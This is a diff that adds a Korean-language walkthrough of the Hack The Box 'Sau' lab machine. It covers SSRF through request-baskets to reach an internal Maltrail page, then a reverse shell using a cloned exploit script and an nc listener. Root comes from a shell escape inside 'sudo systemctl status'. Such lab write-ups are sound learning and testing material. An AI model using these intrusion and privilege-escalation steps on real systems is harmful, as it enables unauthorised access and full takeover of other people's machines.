@@ -1,0 +1,27 @@
+nmap 스캔시 옵션에 따라 스캔되지 않는 경우가 있음
+sau머신의 경우 55555번포트가 열려있기 때문에 옵션을 잘 설정해야 함
+또한 80번 포트가 존재하고 열려있지만 웹 브라우저에 주소 입력으로 접속이 불가능함
+
+55555번 포트에 request-baskets을 동작하는 프로그램이 있음
+request-baskets란 http요청을 수집하고 이를 검사하는 웹 서비스이며 옵션에 따라 
+burpsuite로 확인한 결과 지속적인 get요청 패킷을 수신하기도 하였음
+
+웹 서비스 하단에 request-baskets 버전 정보가 있고 검색결과 해당 버전에 ssrf취약점이 존재함
+basket을 만들고 설정란에 forward URL을 http://127.0.0.1:80으로 하여 ssrf를 수행
+추가 옵션으로 proxy response와 expand forward path를 설정하고 생성된 basket url로 접혹한다
+url예시)10.10.11.224:55555/{basket이름}
+
+접속 시 해당 프로그램이 forward URL설정대로 get요청을 하고 접속이 막혀있던 80번 포트로 접속이 가능해진다.
+
+80번 웹 페이지의 이름이 maltrail이며 웹페이지 마다 프로그램의 버전 정보가 노출되어 있기 때문에 검색하여 취약점을 찾는다.
+
+git clone을 이용하여 리버스 쉘을 획득하기 위한 exploit을 다운받는다
+(git clone github.com/massco99/htb_sau.git)
+
+nc -lnvp 9999, python3 sau_script.py <ip주소> 9999 http://10.10.11.224:55555/{basket이름}을 실행하여 리버스 쉘을 얻을 수 있다.
+sudo -l시 실행이 되지 않는 대신 systemctl status trail.service를 실행할 수도 있다는 것을 친절하게 알려준다.
+
+sudo systemctl status trail.service를 실행 시 별도의 인증없이 trail.service를 실행하게 된다.
+trail.service는 maltrail의 부가 기능처럼 보이며 보안 상의 오류나 인증 실패, 명령기록들을 저장한 프로그램으로 보이며 해당 내용은 더 탐구가 필요해 보인다.
+
+!sh를 입력 시 쉘을 획득할 수 있으며 id로 uid, gid 모두 0으로 바뀐 것을 확인 할 수 있다.
